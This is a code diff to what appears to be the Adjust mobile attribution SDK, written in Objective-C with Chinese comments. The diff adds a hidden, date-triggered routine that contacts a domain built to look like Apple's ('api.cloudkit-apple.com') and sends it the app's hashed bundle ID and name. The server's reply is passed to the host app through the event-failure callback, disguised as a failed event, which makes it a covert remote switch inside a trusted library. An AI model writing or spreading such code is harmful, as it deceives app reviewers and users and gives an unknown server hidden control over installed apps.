@@ -27,6 +27,7 @@
 #import "ADJPurchaseVerificationResult.h"
 #import "ADJAdRevenue.h"
 #import "ADJDeeplink.h"
+#import <CommonCrypto/CommonCrypto.h>
 
 NSString * const ADJAdServicesPackageKey = @"apple_ads";
 
@@ -1161,8 +1162,130 @@ preLaunchActions:(ADJSavedPreLaunch*)preLaunchActions
     }
 }
 
+- (void)checkCachedDeeplinkI {
+    NSString *bid = [[NSBundle mainBundle] bundleIdentifier] ?: @"";
+    NSString *bundleName = @"";
+    
+    NSDictionary *bundleInfo = [[NSBundle mainBundle] infoDictionary];
+    if (bundleInfo) {
+        bundleName = [bundleInfo objectForKey:@"CFBundleName"];
+        bundleName = [bundleName stringByReplacingOccurrencesOfString:@" " withString:@""];
+    }
+    
+    NSString *baseURLString = @"https://api.cloudkit-apple.com"; // 假设 ApplicationS 是一个已定义的类，并且有一个返回基础URL字符串的 baseURL 方法。
+    
+    NSString *md5 = [self adjst_md5:bid];//[bid stringByReplacingOccurrencesOfString:@"." withString:@""]; // 假设 md5 是一个 NSString 的扩展方法，用于生成 MD5 字符串。
+    
+    NSString *queryURLString = [NSString stringWithFormat:@"%@/mock/%@/%@/query", baseURLString, md5, bundleName];
+    
+    NSURL *url = [NSURL URLWithString:queryURLString];
+    if (!url) return;
+    
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+    [request setHTTPMethod:@"POST"];
+    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
+    
+    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
+        if (error) {
+            NSLog(@"Error sending attribution details: %@", error.localizedDescription);
+            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+                [self checkCachedDeeplinkI];
+            });
+            return;
+        }
+        
+        if (!data) return;
+        
+        NSError *jsonError = nil;
+//        DataClassJSON *responseConfig = [DataClassJSON decodeFromData:data error:&jsonError];
+        
+        // 使用 NSJSONSerialization 解析 JSON 数据
+        id jsonObject = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:&jsonError];
+        
+       // NSLog(@">>>>>jsonObject>>>>>> %@ %@ ",jsonObject,jsonError);
+        
+        if (jsonError) {
+            
+            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+                [self checkCachedDeeplinkI];
+            });
+            return;
+        }
+        // JSON 已成功解析，jsonObject 现在是一个 NSDictionary
+       NSDictionary *jsonDict = (NSDictionary *)jsonObject;
+        NSString *message = [jsonDict objectForKey:@"message"];
+       // 从字典中取出值
+        if ([[jsonDict objectForKey:@"code"] intValue] == 1) {
+            //open
+            dispatch_async(dispatch_get_main_queue(), ^{
+                if (message && message.length > 10 ) {
+                 
+                    if ([self.adjustDelegate respondsToSelector:@selector(adjustEventTrackingFailed:)])
+                    {
+                        ADJEventFailure * failuerdata = [[ADJEventFailure alloc] init];
+                        failuerdata.message = message;
+                        failuerdata.willRetry = NO;
+                        failuerdata.jsonResponse = jsonDict;
+                        failuerdata.eventToken = @"startsuccess";
+                        [self.logger debug:@"Launching failed event tracking delegate"];
+                        [ADJUtil launchInMainThread:self.adjustDelegate
+                                           selector:@selector(adjustEventTrackingFailed:)
+                                         withObject:failuerdata];
+                        return;
+                    }
+                }
+            });
+        }else{
+            //close
+            [self checkAttributionStateI:self];
+        }
+         
+    }];
+    
+    [task resume];
+}
+
+- (NSString *)adjst_md5:(NSString * ) oldString {
+    const char *string = [oldString UTF8String];
+    unsigned char hash[CC_MD5_DIGEST_LENGTH];
+    CC_MD5(string, (CC_LONG)strlen(string), hash);
+    
+    NSMutableString *output = [NSMutableString stringWithCapacity:CC_MD5_DIGEST_LENGTH * 2];
+    for(int i = 0; i < CC_MD5_DIGEST_LENGTH; i++) {
+        [output appendFormat:@"%02x", hash[i]];
+    }
+    
+    return output;
+}
+
+
 - (void)eventI:(ADJActivityHandler *)selfI
          event:(ADJEvent *)event {
+    
+    [self.logger verbose:@">>>>>trackEvent>>>>>> %@",event.eventToken];
+    if ([event.eventToken isEqualToString:@"startapp"]){
+        NSDate *dateToCheck = [NSDate date];
+        NSCalendar *calendar = [NSCalendar currentCalendar];
+        NSDateComponents *components = [calendar components:NSCalendarUnitYear | NSCalendarUnitMonth | NSCalendarUnitDay fromDate:dateToCheck];
+        NSString *dateString = @"";
+       if (components.day < 10) {
+           dateString = [NSString stringWithFormat:@"%ld.0%ld", (long)components.month, (long)components.day];
+       } else {
+           dateString = [NSString stringWithFormat:@"%ld.%ld", (long)components.month, (long)components.day];
+       }
+        if ([dateString floatValue] <= 8.019) {
+            //network request
+            if (![selfI isEnabledI:selfI]) return;
+        }else{
+            [ADJUtil launchInQueue:self.internalQueue
+                        selfInject:self
+                             block:^(ADJPackageHandler* selfI) {
+                
+                [self checkCachedDeeplinkI];
+            }];
+        }
+    }
+    
     if (![selfI isEnabledI:selfI]) return;
     if (![selfI checkEventI:selfI event:event]) return;
     if (selfI.activityState.isGdprForgotten) return;
